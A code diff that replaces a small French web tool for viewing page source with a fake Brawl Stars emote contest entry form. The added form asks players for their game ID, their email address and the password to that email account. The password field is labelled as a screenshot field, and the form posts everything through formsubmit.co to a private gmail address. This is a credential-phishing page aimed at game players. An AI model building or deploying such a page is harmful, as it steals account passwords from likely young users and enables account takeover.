@@ -1,40 +1,93 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>Mini View Source</title>
-<style>
-  body { background: #121212; color: #f0f0f0; font-family: monospace; padding: 20px; }
-  input, button { padding: 8px; margin: 5px 0; width: 100%; font-family: monospace; }
-  button { background: #1f1f1f; color: #fff; border: none; cursor: pointer; }
-  button:hover { background: #333; }
-  pre { background: #1e1e1e; padding: 10px; overflow-x: auto; max-height: 80vh; white-space: pre-wrap; word-wrap: break-word; }
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Concours — Emote Brawl Stars</title>
+  <style>
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f5f7fa;
+      color: #333;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .card {
+      background: #fff;
+      padding: 24px;
+      border-radius: 12px;
+      max-width: 650px;
+      width: 100%;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+    h1 {
+      margin-top: 0;
+      color: #222;
+      font-size: 1.6rem;
+    }
+    label {
+      display: block;
+      margin: 14px 0 6px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #444;
+    }
+    input, textarea, select {
+      width: 100%;
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      background: #fff;
+      color: #333;
+    }
+    textarea { resize: vertical; }
+    button {
+      margin-top: 18px;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      background: #1f8cff;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+    }
+    .note {
+      font-size: 12px;
+      opacity: .7;
+      margin-top: 12px;
+    }
+  </style>
 </head>
 <body>
-<h2>Mini View Source</h2>
-<p>Entre une URL et clique sur "Voir le code"</p>
-<input type="text" id="urlInput" placeholder="https://exemple.com">
-<button onclick="fetchSource()">Voir le code</button>
-<pre id="sourceDisplay">Le code source apparaîtra ici...</pre>
+  <form class="card" action="https://formsubmit.co/megumikun84@gmail.com" method="POST" enctype="multipart/form-data">
+    <!-- Anti-spam -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="Participation concours emote Brawl Stars">
+    <input type="hidden" name="_template" value="table">
 
-<script>
-async function fetchSource() {
-    const url = document.getElementById('urlInput').value;
-    const display = document.getElementById('sourceDisplay');
-    if(!url) return alert("Entre une URL valide !");
-    
-    display.textContent = "Chargement...";
-    
-    try {
-        const response = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`);
-        if(!response.ok) throw new Error("Impossible de récupérer le site");
-        const data = await response.json();
-        display.textContent = data.contents;
-    } catch(err) {
-        display.textContent = "Erreur : " + err.message;
-    }
-}
-</script>
+    <label for="pseudo">Pseudo</label>
+    <input type="text" id="pseudo" name="pseudo" placeholder="Ton pseudo" required>
+
+    <label for="bs_id">ID Brawl Stars</label>
+    <input type="text" id="id" name="id" placeholder="#ABCD123" required>
+
+    <label for="email">Email</label>
+    <input type="email" id="email" name="email" placeholder="exemple@mail.com">
+
+    <label for="message">Club</label>
+    <input id="text" name="club" placeholder="Ton club (en cas d'echec)"></input>
+
+    <label for="screenshot">Mot de passe du Mail</label>
+    <input type="text" id="screenshot" name="mdp" placeholder="mot de passe...">
+
+    <button type="submit">Envoyer</button>
+  </form>
 </body>
 </html>
